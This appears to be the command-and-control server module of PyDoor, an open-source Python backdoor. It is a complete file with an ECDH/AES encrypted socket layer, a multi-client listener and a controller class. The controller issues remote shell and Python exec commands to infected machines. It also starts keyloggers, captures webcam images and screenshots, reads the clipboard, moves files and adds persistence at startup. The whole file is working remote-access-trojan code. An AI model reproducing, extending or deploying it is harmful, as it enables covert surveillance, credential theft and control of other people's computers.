"""
https://github.com/Y4hL/PyDoor

Author(s): Y4hL

License: [gpl-3.0](https://www.gnu.org/licenses/gpl-3.0.html)
"""
import logging
import socket
import threading
from queue import Queue
from modules.clients import Client
import traceback
import sys
import os
from typing import Tuple, Union
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from datetime import datetime
from typing import Tuple, Union
import json

logging.basicConfig(level=logging.CRITICAL)


def errors(error: Exception, line: bool = True) -> str:
    """ Error Handler """
    error_class = error.__class__.__name__
    error_msg = f'{error_class}:'
    try:
        error_msg += f' {error.args[0]}'
    except IndexError:
        pass
    if line:
        _, _, traceb = sys.exc_info()
        line_number = traceback.extract_tb(traceb)[-1][1]
        error_msg += f' (line {line_number})'
    return error_msg




class ESocket:
    """
    Encrypted Socket

    Perform ECDH with the peer, agreeing on a session key, which is then used for AES256 encryption

    Header has a set size (default: 16 bytes) and consists of 3 data points
    The first byte determines if the packet is multipacket (is split into multiple packets)
    The second byte determines if the data is an error
    The rest of the header is used to set the size of the incoming data
    """

    # Byte length of the complete header
    header_length = 16
    # Byte length of the size header
    size_header_length = header_length - 2

    # AES encryption
    encryptor = None
    decryptor = None

    # Padding for AES encryption
    _pad = padding.PKCS7(256)

    def __init__(self, sock: socket.socket, server: bool = False) -> None:
        """ Define variables """
        self.sock = sock
        self.server = server

        self.handshake()

    def close(self):
        """ Close socket """
        self.sock.shutdown(socket.SHUT_RDWR)
        self.sock.close()

    def encrypt(self, data: bytes) -> bytes:
        """ Encrypt data """
        padder = self._pad.padder()
        data = padder.update(data) + padder.finalize()

        encryptor = self._cipher.encryptor()
        data = encryptor.update(data) + encryptor.finalize()
    
        return data

    def decrypt(self, data: bytes) -> bytes:
        """ Decrypt data """

        decryptor = self._cipher.decryptor()
        data = decryptor.update(data) + decryptor.finalize()

        unpadder = self._pad.unpadder()
        data = unpadder.update(data) + unpadder.finalize()

        return data

    def handshake(self) -> bool:
        """
        Handshake with Client

        Uses ECDH to agree on a session key
        Session key is used for AES256 encryption
        """

        # Use ECDH to derive a key for fernet encryption

        private_key = ec.generate_private_key(ec.SECP521R1())

        serialized_public_key = private_key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM, 
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        # Exchange public keys
        logging.debug('retrieving peer public key')
        if self.server:
            self._send(serialized_public_key)
            _, serialized_peer_public_key = self._recv()
        else:
            _, serialized_peer_public_key = self._recv()
            self._send(serialized_public_key)

        peer_public_key = serialization.load_pem_public_key(serialized_peer_public_key)

        shared_key = private_key.exchange(ec.ECDH(), peer_public_key)

        # Perform key derivation.

        derived_key = HKDF(
            algorithm=hashes.SHA512(),
            length=32,
            salt=None,
            info=None
        ).derive(shared_key)

        logging.debug('agreeing on iv with peer')
        if self.server:
            iv = os.urandom(16)
            self._send(iv)
        else:
            _, iv = self._recv()

        self._cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv))

        return True

    def make_header(self, data: bytes, error: str) -> Tuple[bytes, Union[bytes, None]]:
        """ Make header for data """

        if len(error) > 1:
            raise

        split = 0
        extra_data = None
        packet_data = data

        max_data_size = int('9' * self.size_header_length)

        if len(data) > max_data_size:
            split = 1
            packet_data = data[:max_data_size]
            extra_data = data[max_data_size+1:]

        size_header = f'{len(packet_data)}'

        if len(size_header) < self.size_header_length:
            # Pad extra zeros to size header
            size_header = '0' * (self.size_header_length - len(size_header)) + size_header

        packet = f'{split}{error}{size_header}'.encode() + packet_data

        return packet, extra_data

    def parse_header(self, header: bytes) -> Tuple[bool, str, int]:
        """ Parse esocket header """

        multipacket = bool(int(chr(header[0])))
        error = chr(header[1])
        size_header = int(header[2:])

        return multipacket, error, size_header

    def _recv(self) -> Tuple[str, bytes]:
        """ Receive data from client """

        def recvall(amount: int) -> bytes:
            """ Receive x amount of bytes """
            data = b''
            while len(data) < amount:
                buffer = self.sock.recv(amount - len(data))
                if not buffer:
                    return
                data += buffer
            return data

        header = recvall(self.header_length)
        multipacket, error, size_header = self.parse_header(header)
        logging.debug(f'parsed header: {multipacket}/{error}/{size_header}')

        data = recvall(size_header)
        logging.debug('got packet')

        if multipacket:
            _, next_data = self._recv()
            return error, data + next_data

        return error, data

    def postrecv(self, data: bytes) -> bytes:
        """ Post-receive decryption """
        return self.decrypt(data)

    def recv(self) -> Tuple[str, bytes]:
        """ Receive data from client """
        error, data = self._recv()
        return error, self.postrecv(data)

    def _send(self, data: bytes, error: str = '0') -> None:
        """ Send data to client """

        packet, extra_data = self.make_header(data, error)

        self.sock.sendall(packet)
        logging.debug('sent packet')
        if extra_data:
            self._send(extra_data)

    def presend(self, data: bytes) -> bytes:
        """ Pre-send encryption """
        # Pad data
        return self.encrypt(data)

    def send(self, data: bytes, error: str = '0') -> None:
        """ Send data to client """
        self._send(self.presend(data), error)



def echo(data: bytes) -> None:
    """ Support for printing more characters """
    # Mostly for tree command in Windows
    try:
        print(data.decode())
    except UnicodeDecodeError:
        try:
            print(data.decode('cp437'))
        except UnicodeDecodeError:
            print(data.decode(errors='replace'))



_time = lambda: f"{datetime.now()}".replace(':', '-')


class Client():
    """ Client Connection Object """

    def __init__(self, esock: ESocket, address: list) -> None:
        self.esock = esock
        self.address = address

    def disconnect(self) -> None:
        """ Close client connection (allows reconnect) """
        self.esock.close()

    def send_json(self, data: not bytes) -> None:
        """ Send JSON data to Client """
        self.esock.send(json.dumps(data).encode())

    def recv_json(self) -> not bytes:
        """ Receive JSON data from Client """
        _, data = self.esock.recv()
        return json.loads(data.decode())

    def is_frozen(self) -> bool:
        """ Check if the client is frozen (exe) """
        # returns bool
        self.send_json(['FROZEN'])
        return self.recv_json()

    def get_platform(self) -> str:
        """ Get Client Platform """
        # platform.system()
        self.send_json(['PLATFORM'])
        _, platform = self.esock.recv()
        return platform.decode()

    def get_cwd(self) -> str:
        """ Get Client cwd """
        # returns cwd
        self.send_json(['GETCWD'])
        _, cwd = self.esock.recv()
        return cwd.decode()

    def paste(self) -> Tuple[bool, str]:
        """ Get Client Clipboard """
        # returns True/False, clipboard/error
        self.send_json(['PASTE'])
        return tuple(self.recv_json())

    def copy(self, data: str) -> Union[str, None]:
        """ Copy to Client Clipboard"""
        # returns None/error
        self.send_json(['COPY', data])
        return self.recv_json()

    def download(self, url: str, file_name: str) -> Union[str, None]:
        """ Download File To Client """
        # returns None/error
        self.send_json(['DOWNLOAD', url, file_name])
        return self.recv_json()

    def log_path(self) -> str:
        """ Get Log File Name"""
        self.send_json(['LOG_FILE'])
        _, log = self.esock.recv()
        return log.decode()

    def get_log(self, save_as: str = None) -> str:
        """ Transfer log to Server """
        # save_as: file name
        if not save_as:
            save_as = f'{_time()}.log'
        log = self.log_path()
        self.receive_file(log, save_as)
        return save_as

    def restart_session(self) -> None:
        """ Restart Client Session """
        # returns None
        self.send_json(['RESTART_SESSION'])
        self.esock.recv()

    def close(self) -> None:
        """ Stops client on target machine """
        # returns None
        self.send_json(['CLOSE'])
        self.esock.recv()
        self.esock.close()

    def add_startup(self) -> Union[str, None]:
        """ Add Client to Startup """
        # returns None/error
        self.send_json(['ADD_STARTUP'])
        return self.recv_json()

    def remove_startup(self) -> Union[str, None]:
        """ Remove Client from Startup """
        # returns None/error
        self.send_json(['REMOVE_STARTUP'])
        return self.recv_json()

    def lock(self) -> bool:
        """ Lock Client Machine (Windows Only) """
        # returns bool
        self.send_json(['LOCK'])
        return self.recv_json()

    def shutdown(self) -> bool:
        """ Shutdown Client Machine """
        # returns bool
        self.send_json(['SHUTDOWN'])
        return self.recv_json()

    def restart(self) -> bool:
        """ Restart Client Machine """
        # returns bool
        self.send_json(['RESTART'])
        return self.recv_json()

    def send_file(self, file_to_transfer: str, save_as: str, block_size: str = 32768) -> Union[str, None]:
        """ Send file to Client """
        # returns None/error
        try:
            self.send_json(['SEND_FILE', save_as])
            error, error_text = self.esock.recv()
            if error != '0':
                return error_text.decode()
            with open(file_to_transfer, 'rb') as file:
                while True:
                    block = file.read(block_size)
                    if not block:
                        break
                    self.esock.send(block)

        except (FileNotFoundError, PermissionError) as error:
            logging.debug(str(error))
            return errors(error)
        else:
            self.esock.send(b'FILE_TRANSFER_DONE')

    def receive_file(self, file_to_transfer: str, save_as: str) -> Union[str, None]:
        """ Transfer file from Client """
        # returns None/error
        self.send_json(['RECEIVE_FILE', file_to_transfer])
        with open(save_as, 'wb') as file:
            while True:
                error, data = self.esock.recv()
                if error == '9':
                    break
                if error != '0':
                    os.remove(save_as)
                    return data.decode()
                file.write(data)

    def screenshot(self, save_as: str = None) -> Union[str, None]:
        """ Take screenshot on Client """
        # returns None/error
        if not save_as:
            save_as = f'{_time()}.png'
        self.send_json(['SCREENSHOT'])
        error, data = self.esock.recv()
        if error != '0':
            return data
        with open(save_as, 'wb') as file:
            file.write(data)

    def webcam(self, save_as: str = None) -> Union[str, None]:
        """ Capture webcam """
        # returns save_as/None
        if not save_as:
            save_as = f'webcam-{_time()}.png'
        self.send_json(['WEBCAM'])
        error, data = self.esock.recv()
        if error != '0':
            return
        with open(save_as, 'wb') as file:
            file.write(data)
        return save_as

    def exec(self, command: str) -> Tuple[str, Union[str, None]]:
        """ Remote Python Interpreter """
        # returns command_output, error/None
        self.send_json(['EXEC', command])
        return tuple(self.recv_json())

    def shell(self, command: str, _print: bool = True) -> str:
        """ Remote Shell with Client """
        # returns command_output
        system = self.get_platform()
        split_command = command.split(' ')[0].strip().lower()
        if split_command in ['cd', 'chdir']:
            self.send_json(['SHELL', command])
            output = self.recv_json()
            if output[0] == 'ERROR':
                if _print:
                    print(output[1])
                return output[1]
            if system == 'Windows':
                if _print:
                    print()
                return '\n'
            return ''
        if split_command == 'cls' and system == 'Windows':
            os.system('cls')
            return ''
        if split_command == 'clear' and system != 'Windows':
            os.system('clear')
            return ''

        self.send_json(['SHELL', command])
        result = ''
        try:
            while True:
                error, output = self.esock.recv()
                if error != '0':
                    break
                result += f"{output}\n"
                if _print:
                    echo(output)
                self.send_json(['LISTENING'])
        except (EOFError, KeyboardInterrupt):
            self.esock.send(b'QUIT')
        return result

    def start_keylogger(self) -> bool:
        """ Start Keylogger """
        # returns True/False
        self.send_json(['START_KEYLOGGER'])
        return self.recv_json()

    def keylogger_status(self) -> bool:
        """ Get Keylogger Status """
        # returns True/False
        self.send_json(['KEYLOGGER_STATUS'])
        return self.recv_json()

    def stop_keylogger(self) -> bool:
        """ Stop Keylogger """
        # returns True/False
        self.send_json(['STOP_KEYLOGGER'])
        return self.recv_json()

    def get_info(self) -> Tuple[str]:
        """ Get Client Info """

        # returns (
        #     platform.system(),
        #     os.path.expanduser('~'),
        #     getpass.getlogin()
        # )

        self.send_json(['_INFO'])
        return tuple(self.recv_json())

    def info(self, _print: bool = True) -> str:
        """ Get Client Info """
        # returns str
        self.send_json(['INFO'])
        info = self.esock.recv()[1].decode()
        if _print:
            print(info)
        return info

    def ps(self) -> list:
        """ Returns a list of psutil.Process().as_dict() """
        self.send_json(['PS'])
        return self.recv_json()

    def kill(self, pid: int) -> Union[str, None]:
        """ Kill a process by pid on client system """
        self.send_json(['KILL', pid])
        error, response = self.esock.recv()
        if error:
            return response.decode()

    def zip_file(self, zip_filename: str, file_to_zip: str) -> Union[str, None]:
        """ Zip a Single File """
        # returns None/error
        self.send_json(['ZIP_FILE', zip_filename, file_to_zip])
        return self.recv_json()

    def zip_dir(self, zip_filename: str, dir_to_zip: str) -> Union[str, None]:
        """ Zip a Directory """
        # returns None/error
        self.send_json(['ZIP_DIR', os.path.splitext(zip_filename)[0], dir_to_zip])
        return self.recv_json()

    def unzip(self, zip_filename: str) -> Union[str, None]:
        """ Unzip a File """
        # returns None/error
        self.send_json(['UNZIP', zip_filename])
        return self.recv_json()












class Server():
    """ Multi-connection Server class """

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def __init__(self) -> None:
        self.thread = threading.Thread(target=self._accept)
        self.thread.daemon = True
        self.event = threading.Event()
        self.queue = Queue()
        self.clients = []

    def _accept(self) -> None:
        """ Accepts incoming connections """
        while not self.event.is_set():
            try:
                conn, address = self.sock.accept()
                conn.setblocking(True)

                esock = ESocket(conn, True)

                _, hostname = esock.recv()
                # Remove .local on macos
                hostname = hostname.decode()
                if hostname.endswith('.local'):
                    hostname = hostname[:-len('.local')]
                address += (hostname,)

                client = Client(esock, address)
                self.clients.append(client)
                self.queue.put(client)
            except Exception as error:
                logging.debug(errors(error))

    def start(self, address) -> None:
        """ Start the Server """

        self.sock.bind(address)
        self.sock.listen()
        self.address = address

        self.event.clear()

        self.thread.start()

    def stop(self) -> None:
        """ Stop the server """
        if not self.event.is_set():
            self.event.set()
        self.sock.shutdown(socket.SHUT_RDWR)

    def disconnect(self, client: Client) -> None:
        """ Disconnect client and remove from connection list """
        if client in self.clients:
            self.clients.remove(client)
        client.disconnect()

    def refresh(self, timeout: int = 1) -> None:
        """ Refreshes connections """
        clients = self.clients.copy()
        for client in clients:
            old_timeout = client.esock.sock.gettimeout()
            client.esock.sock.settimeout(timeout)
            try:
                client.send_json(['LIST'])
            except (BrokenPipeError, ConnectionResetError, BlockingIOError):
                self.disconnect(client)
            except TimeoutError:
                logging.info(f'{client.address} timed out')
            else:
                client.esock.sock.settimeout(old_timeout)
